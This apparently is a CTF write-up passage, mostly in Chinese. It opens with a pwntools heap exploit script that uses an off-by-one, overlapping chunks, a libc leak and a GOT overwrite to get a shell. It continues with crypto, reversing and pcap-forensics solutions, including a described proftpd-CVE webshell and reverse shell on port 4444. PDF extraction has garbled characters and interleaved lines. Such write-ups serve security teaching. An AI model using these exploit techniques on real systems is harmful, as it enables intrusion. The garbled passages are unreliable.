    sl('5')
    return
def deletercvr(index):
    menu()
    sl('4')
    ru('?')
    sl(str(index))
    return
def newrcvr():
    menu()
    sl('2')
    return
def setReceiver(name,postcode,contact,address):
    menu()
    sl('1')
    ru('?')
    sn(name)
    ru('?')
    sn(postcode)
    ru('?')
    sn(contact)
    ru('?')
    sn(address)
    return
def newPackage(length, data):
    menu()
    sl('2')
    ru('?')
    sl(str(length))
    ru('~')
    sn(data)
    return
def savePackage():
    menu()
    sl('5')
    return
def exitAddRecv():
    menu()
    sl('6')
    return
def deletePackage(index):
    menu()
    sl('3')
    ru('?')
    sl(str(index))
    return
def editrcvr(index,name,postcode,contact,address):
    menu()
    sl('3')
    ru('?')
    sl(str(index))
    ru('?')
    sn(name)
    ru('?')
    sn(postcode)
    ru('?')
    sn(contact)
    ru('?')
    sn(address)
    return
# define exploit function here
def pwn():
    if DEBUG: gdb.attach(io)
    enterGame()
    senderinfo('1\n', '1\n')
    newrcvr()
    setReceiver('1\n', '1\n', '1\n', '1\n')
    newPackage(160, 'a'.ljust(159,'a')+'\n')
    newPackage(160, 'b'.ljust(159,'b')+'\n')
    newPackage(160, 'c'.ljust(159,'c')+'\n')
    newPackage(8, 'pad\n')  # sep
    newPackage(160, 'd'.ljust(159,'d')+'\n')
    newPackage(224, 'e'.ljust(223,'e')+'\n')
    #newPackage(160, 'f\n')
    deletePackage(2)
    deletePackage(1)
    savePackage()
    newrcvr()
    setReceiver('2\n', '2\n', '2\n', '2\n')     # take original
 2
    newPackage(160, 'x'*152 + p64(816))    # take 1, off by one
    deletePackage(3)            # delete 3
    deletePackage(3)            # wild chunk overlap
    savePackage()
    newrcvr()
    exitAddRecv()
    newrcvr()
    setReceiver('3\n', '3\n', '3\n', '3\n')
    newPackage(0x1f0, 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa
AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAh
AA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAq
AA' + p64(0x602ff0) + p64(0x0) + '\n')
    exitAddRecv()
    editrcvr(0, '1\n', '1\n', '1\n', '/bin/sh;\n')
    showrcvr()
    for i in xrange(2):     ru('address:')
    addr = u64(rn(6).ljust(8,'\x00')) - 0x00000000000ec690
    info("Libc leak = " + hex(addr))
    system = addr + 0x468f0
    read = addr + 0xec690
    editrcvr(1, '1\n', '1\n', p64(system)[:-1] + '\n', p64(read
)[:-1] + '\n')
    editrcvr(0, 'x\n', 'x\n', 'x\n', 'x\n')
    io.interactive()
    return
if __name__ == '__main__':
    pwn()
ntfs流提取出⼀一个zip压缩包，把最后部分的空⽩白那⼏几⾏行行去掉0d 0a，然后LSB每7
位表示⼀一个字节，得到ﬂag为6d3677dd
Misc 
Misc150 
提示是维吉尼亚密码，⽽而且没给秘钥，gg下找到⼀一个爆破⽹网址：
https://www.guballa.de/vigenere-solver
​
，秘钥⻓长度3-120：
得到明⽂文：
Aliceleavestheteapartyandentersthegardenwhereshecomesuponthreelivingplayi
ngcardspaintingthewhiterosesonarosetreeredbecausethequeenofheartshatesw
hiterosesaprocessionofmorecardskingsandqueensandeventhewhiterabbitenter
sthegardenalicethenmeetsthekingandqueenthequeenaﬁgurediﬃculttopleaseintr
oduceshertrademarkphraseoﬀwithhisheadwhichsheuttersattheslightestdissatisf
actionwithasubjectaliceisinvitedorsomemightsayorderedtoplayagameofcroquet
withthequeenandtherestofhersubjectsbutthegamequicklydescendsintochaosliv
eﬂamingosareusedasmalletsandhedgehogsasballsandaliceonceagainmeetsthe
cheshirecatthequeenofheartsthenordersthecattobebeheadedonlytohaveherexe
cutionercomplainthatthisisimpossiblesincetheheadisallthatcanbeseenofhimbec
ausethecatbelongstotheduchessthequeenispromptedtoreleasetheduchessfrom
prisontoresolvethematter
Gg下，发现是（爱丽丝梦游仙境?）：
​
根据题⽬目要求进⾏行行加密得到ﬂag。
动态调试发现加密密钥为htsii__sht_eek.y，然后aes加密，加密后的字符为{21,
challenge_how_many_Vigenère 
easy100 
-93, -68, -94, 86, 117, -19, -68,-92, 33, 50, 118, 16, 13, 1, -15, -13, 3, 4, 103,
-18, 81, 30, 68, 54, -93, 44, -23,93, 98, 5, 59}，解密出来即是ﬂag。
So⾥里里⾯面检测了了调试环境，patch检测的字符串串即可绕过，点击的button被隐藏
了了，在右下⻆角，绕过反调试后后动态调试下发现取出输⼊入的5-38位后进⾏行行逆置，
对逆置的字符串串进⾏行行base64编码后和
dHR0dGlldmFodG5vZGllc3VhY2VibGxlaHNhdG5hd2k进⾏行行⽐比较，解密出来再逆
置回去即是ﬂag：iwantashellbecauseidonthaveitttt
流量量中发现攻击者⾸首先利利⽤用proftpd的⼀一个洞洞上传了了webshell然后反弹shell了了⼀一个
4444端⼝口。利利⽤用4444端⼝口的shell写了了⼀一个新的webshell进来。然后利利⽤用新的
webshell下载了了两个图⽚片⽂文件。
两个图⽚片⽂文件异或后获得⼀一个python脚本。
import sys
key = '******************'
flag = 'AES_key{***************}'
if len(key) % 2 == 1:
    print("Key Length Error")
    sys.exit(1)
n = len(key) / 2
encrypted = ''
for c in flag:
    c = ord(c)
    for a, b in zip(key[0:n], key[n:2*n]):
        c = (ord(a) * c + ord(b)) % 251
    encrypted += '%02x' % c
print encrypted
#encrypt="cc90b9054ca67557813694276ab54c67aa93092ec87dd7b539"
⽤用⼀一个脚本解出AES_key
m="cc90b9054ca67557813694276ab54c67aa93092ec87dd7b539"
Easyeasy200 
Misc400 
def process(a,b,m):
    return "".join(map(chr,map(lambda x: (x*a+b)%251,map(ord,m.
decode('hex')))))
for i in xrange(255):
    for j in xrange(255):
        if "AES_key{" in process(i,j,m):
            print process(i,j,m)
#AES_key{FK4Lidk7TwNmRWQd}
关于原理理可以看下的MMACTF 2016的Super Express
然后发现⼀一段奇怪的DNS请求，将数据取出然后⽤用上⾯面算出的aeskey解密。
#!/usr/bin/env python
# encoding:utf-8
__author__ = 'albertchang'
from Crypto.Cipher import AES
from Crypto import Random
import base64
def decrypt(data, password):
    unpad = lambda s: s[0:-ord(s[-1])]
    iv = data[:16]
    cipher = AES.new(password, AES.MODE_CBC, iv)
    data = cipher.decrypt(data[16:])
    return data
if __name__ == '__main__':
    password = 'FK4Lidk7TwNmRWQd'
    encrypt_data1 = base64.b64decode(
        'OYzmTh2MGNclc5gALl+2lJ/xu58d4dAtidJc2w4dRhB1cuh/pXAt17
QSjEIFMPiSE6w+DXpXJk9zm0FD39MGvwL4ZNpr2YndIPnjnb0W3xNeP+e5r//Gh
TYkNTdPo4xpT4d+HMihDB1mZNcQ8Gib69l5NlqC8PFjEeABWPfJezqG0LozsEju
kHJOCMhVlRrirtkI7/ExFZAgH+G1i/gaw84nJ0DbGXQEpA2wySh6/iXeJD1ZYgt
7jRgKLCL6CGggxsAEP9+m3QTZkxEitNqplA==')
    encrypt_data2 = base64.b64decode(
        'Mvw3nE7h3GtoC0xqGKmjboBW7h+WyH+QhJRd1EL+Qc7cgRAaVNYwWr
WDMByHOIlSig+MvEg0GTihcnuNdgRpD4fgmEgjvAvScqJkQUes+Mxbi4NNkCv6Y
ANnbGFbZSUVs3YbulPu6Xzj+/nBmJcOsti94BHja8Cjym4l2qpmIkjR6kONAs2e
7uAkduLR1zH9')
    decrypt_data1 = decrypt(encrypt_data1, password)
    print 'decrypt_data1:\n', decrypt_data1
    decrypt_data2 = decrypt(encrypt_data2, password)
    print 'decrypt_data2:\n', decrypt_data2
得到
 Please submit the used ftp CVE ID like "CVE********"and
LCTF{A11_1n_0ne_Pcap} as your flag.eg."CVE12345678A11_1n_0ne_Pcap" 
搜到https://www.exploit-db.com/exploits/36803/
故CVE20153306A11_1n_0ne_Pcap
⽤用ida可以看到程序不不停的使⽤用QMetaObject的activate⽅方法来调⽤用其它的函数。
由于对Qt不不太熟我选择在各关键函数上下断点看call stack，⼀一层层追溯回去可以
找到加密的地⽅方，写出对应的解密代码。（解密得到的ﬂag最后不不知道为啥有⼏几
位是不不可⻅见字符，不不过根据其它位置可以猜出来...）
脚本：
#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from ctypes import *
from hexdump import hexdump
iv = 'Cirno'
def ror8(x,bits):
    r = (((x >> bits) & 0xff) | ( x << (8-bits))) & 0xff
    return r